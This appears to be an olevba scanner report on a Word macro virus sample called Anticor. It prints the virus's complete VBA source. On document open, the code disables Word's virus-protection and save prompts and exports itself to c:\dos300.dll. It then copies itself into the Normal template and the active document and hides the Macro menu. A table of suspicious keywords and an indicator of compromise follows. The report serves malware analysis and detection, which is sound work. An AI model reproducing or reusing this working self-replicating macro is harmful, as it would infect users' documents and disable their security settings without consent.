olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Anticor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Anticor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
Set o = Options
o.VirusProtection = (Rnd * 0): o.SaveNormalPrompt = (Rnd * 0)
o.confirmconversion = (Rnd * 0)
If System.ProfileString("HKEY_LOCAL_MACHINE/Software/Microsoft/Office/", "AntiCor") <> "AntiCor" Then
GoTo SaberI
End If
SaberI:
ThisDocument.VBProject.VBComponents(1).Export ("c:\dos300.dll")
If CommandBars("Tools").Controls("Macro").Visible = True Then
Set this = ThisDocument.VBProject.VBComponents(1).CodeModule
Set x = NormalTemplate.VBProject
Set x2 = x.VBComponents(1).CodeModule
End If
Set y = ActiveDocument.VBProject
Set y2 = y.VBComponents(1).CodeModule
CommandBars("Tools").Controls("Macro").Visible = False
Set nlin = x2.CountOfLines
Set alin = y2.CountOfLines
If nlin < this.CountOfLines Then
 x2.AddFromFile ("c:\dos300.dll")
 x2.deletelines 1, 4
Else
If alin < this.CountOfLines Then
y2.AddFromFile ("c:\dos300.dll")
y2.deletelines 1, 4
End If
End If
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE/Software/Microsoft/Office/", "AntiCor") = "AntiCor"
'WM2000/WM97 - AntiCoruption by ImPU1s3
'Greetinz to membaz of EvilNet Inc.
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |dos300.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

